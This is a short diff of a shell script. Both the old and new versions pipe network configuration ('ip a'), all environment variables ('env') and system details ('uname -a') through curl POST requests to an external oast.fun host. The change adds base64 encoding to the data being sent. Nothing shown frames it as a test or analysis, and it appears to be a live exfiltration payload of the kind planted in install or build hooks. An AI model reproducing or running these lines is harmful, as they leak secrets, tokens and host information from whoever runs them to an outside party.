@@ -1,4 +1,4 @@
-ip a | curl -X POST iwouzhpjivqoqmazrhno4vkqqnhaa9hvr.oast.fun --data-binary @-
-env | curl -X POST iwouzhpjivqoqmazrhno4vkqqnhaa9hvr.oast.fun --data-binary @-
-uname -a | curl -X POST iwouzhpjivqoqmazrhno4vkqqnhaa9hvr.oast.fun --data-binary @-
+ip a | base64 | curl -X POST iwouzhpjivqoqmazrhno4vkqqnhaa9hvr.oast.fun --data-binary @-
+env | base64 | curl -X POST iwouzhpjivqoqmazrhno4vkqqnhaa9hvr.oast.fun --data-binary @-
+uname -a | base64 |  curl -X POST iwouzhpjivqoqmazrhno4vkqqnhaa9hvr.oast.fun --data-binary @-
 exit 1
